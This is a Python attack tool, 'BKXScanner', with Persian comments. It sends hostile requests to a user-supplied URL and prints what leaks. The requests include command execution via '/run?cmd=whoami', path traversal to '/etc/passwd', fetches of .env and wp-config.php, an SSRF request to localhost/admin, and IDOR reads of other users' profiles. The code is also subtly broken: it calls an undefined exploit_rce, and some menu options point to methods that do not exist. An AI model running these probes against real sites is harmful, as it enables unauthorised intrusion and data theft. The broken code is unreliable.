import asyncio
import aiohttp
import os
import sys
from colorama import Fore, Style, init

# تنظیمات colorama
init(autoreset=True)

# ویژگی‌های اسکنر
FEATURES = {
    "1": "ssrf",
    "2": "idor",
    "3": "rce",
    "4": "path_traversal",
    "5": "directory_bruteforce",
    "6": "sensitive_files_scan",
    "7": "shodan_lookup",
    "8": "multi_threaded_scan",
    "9": "interactive_mode",
    "10": "proxy_support",
    "11": "exit"
}

# لوگوی ابزار
LOGO = f"""{Fore.CYAN}
 █████╗ ██╗
██╔══██╗██║
███████║██║
██╔══██║██║
██║  ██║███████╗
╚═╝  ╚═╝╚══════╝
{Style.RESET_ALL}"""

class BKXScanner:
    def __init__(self, target_url, shodan_api_key=None):
        self.target_url = target_url.rstrip("/")
        self.shodan_api_key = shodan_api_key
        self.session = None

    async def start_session(self):
        """ایجاد سشن برای درخواست‌های HTTP"""
        if not self.session:
            self.session = aiohttp.ClientSession()

    async def close_session(self):
        """بستن سشن بعد از اتمام اسکن"""
        if self.session:
            await self.session.close()

    async def request(self, url):
        """مدیریت درخواست HTTP با کنترل خطا"""
        try:
            if not self.session:
                await self.start_session()  # اطمینان از مقداردهی سشن
            
            async with self.session.get(url, timeout=5) as response:
                if response.status == 200:
                    return await response.text()
                else:
                    print(f"{Fore.RED}Request failed with status {response.status}{Style.RESET_ALL}")
                    return None
        except Exception as e:
            print(f"{Fore.RED}Request failed: {e}{Style.RESET_ALL}")
            return None

    async def scan_ssrf(self):
        """ بررسی SSRF """
        await self.start_session()
        test_url = f"{self.target_url}/internal-api"
        print(f"{Fore.GREEN}Scanning {test_url} for SSRF...{Style.RESET_ALL}")

        result = await self.request(test_url)
        if result:
            print(f"{Fore.RED}Possible SSRF vulnerability detected!{Style.RESET_ALL}")
            print(f"🔍 {Fore.YELLOW}Leaked Data:{Style.RESET_ALL}\n{result[:500]}")
            await self.exploit_ssrf()
        else:
            print(f"{Fore.YELLOW}No SSRF vulnerability found.{Style.RESET_ALL}")

    async def scan_idor(self):
        """ بررسی IDOR """
        await self.start_session()
        test_url = f"{self.target_url}/profile?user_id=1"
        print(f"{Fore.GREEN}Scanning {test_url} for IDOR...{Style.RESET_ALL}")

        result = await self.request(test_url)
        if result and "username" in result:
            print(f"{Fore.RED}IDOR detected! User data is exposed.{Style.RESET_ALL}")
            print(f"🔍 {Fore.YELLOW}Leaked Data:{Style.RESET_ALL}\n{result[:500]}")
            await self.exploit_idor()
        else:
            print(f"{Fore.YELLOW}No IDOR vulnerability found.{Style.RESET_ALL}")

    async def scan_rce(self):
        """ بررسی RCE """
        await self.start_session()
        test_url = f"{self.target_url}/run?cmd=whoami"
        print(f"{Fore.GREEN}Scanning {test_url} for RCE...{Style.RESET_ALL}")

        result = await self.request(test_url)
        if result and "root" in result:
            print(f"{Fore.RED}Possible RCE detected! Server execution is possible.{Style.RESET_ALL}")
            print(f"🔍 {Fore.YELLOW}Leaked Data:{Style.RESET_ALL}\n{result.strip()}")
            await self.exploit_rce()
        else:
            print(f"{Fore.YELLOW}No RCE vulnerability found.{Style.RESET_ALL}")

    async def scan_path_traversal(self):
        """ بررسی Path Traversal """
        await self.start_session()
        test_url = f"{self.target_url}/download?file=../../etc/passwd"
        print(f"{Fore.GREEN}Scanning {test_url} for Path Traversal...{Style.RESET_ALL}")

        result = await self.request(test_url)
        if result and "root:x" in result:
            print(f"{Fore.RED}Possible Path Traversal vulnerability found!{Style.RESET_ALL}")
            print(f"🔍 {Fore.YELLOW}Leaked Data:{Style.RESET_ALL}\n{result[:500]}")
        else:
            print(f"{Fore.YELLOW}No Path Traversal vulnerability found.{Style.RESET_ALL}")

    async def scan_sensitive_files(self):
        """ بررسی فایل‌های حساس """
        files = ["robots.txt", ".git/config", ".env", "config.php", "wp-config.php"]
        for file in files:
            await self.start_session()
            test_url = f"{self.target_url}/{file}"
            print(f"{Fore.GREEN}Checking {test_url}...{Style.RESET_ALL}")

            result = await self.request(test_url)
            if result:
                print(f"{Fore.RED}Sensitive file found: {file}{Style.RESET_ALL}")
                print(f"🔍 {Fore.YELLOW}Leaked Data:{Style.RESET_ALL}\n{result[:500]}")
            else:
                print(f"{Fore.YELLOW}No sensitive file found: {file}{Style.RESET_ALL}")

    async def exploit_idor(self):
        """ اجرای نفوذ آزمایشی IDOR """
        print(f"{Fore.MAGENTA}[*] Attempting IDOR Exploit...{Style.RESET_ALL}")
        test_url = f"{self.target_url}/profile?user_id=2"
        result = await self.request(test_url)
        if result:
            print(f"{Fore.RED}[!!] IDOR Exploit Success! Leaked Data:\n{result[:500]}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[X] IDOR exploit failed.{Style.RESET_ALL}")

    async def exploit_ssrf(self):
        """ اجرای نفوذ آزمایشی SSRF """
        print(f"{Fore.MAGENTA}[*] Attempting SSRF Exploit...{Style.RESET_ALL}")
        test_url = f"{self.target_url}/internal-api?url=http://localhost/admin"
        result = await self.request(test_url)
        if result:
            print(f"{Fore.RED}[!!] SSRF Exploit Success! Leaked Data:\n{result[:500]}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[X] SSRF exploit failed.{Style.RESET_ALL}")

async def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(LOGO)

    target_url = input(f"{Fore.YELLOW}Enter target URL: {Style.RESET_ALL}")
    if not target_url.startswith("http"):
        print(f"{Fore.RED}Invalid URL! Please include http:// or https://{Style.RESET_ALL}")
        return

    scanner = BKXScanner(target_url)
    await scanner.start_session()

    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(LOGO)

        for key, feature in FEATURES.items():
            print(f"{Fore.CYAN}[{key}] {feature.replace('_', ' ').title()}{Style.RESET_ALL}")

        choice = input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}")

        if choice == "11":
            print(f"{Fore.GREEN}Exiting...{Style.RESET_ALL}")
            break

        if choice in FEATURES:
            task_name = f"scan_{FEATURES[choice]}"
            task = getattr(scanner, task_name, None)

            if task and callable(task):
                await task()
                input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Feature not implemented yet.{Style.RESET_ALL}")
                input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Invalid choice! Please select a valid option.{Style.RESET_ALL}")
            input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

    await scanner.close_session()

if __name__ == "__main__":
    asyncio.run(main())
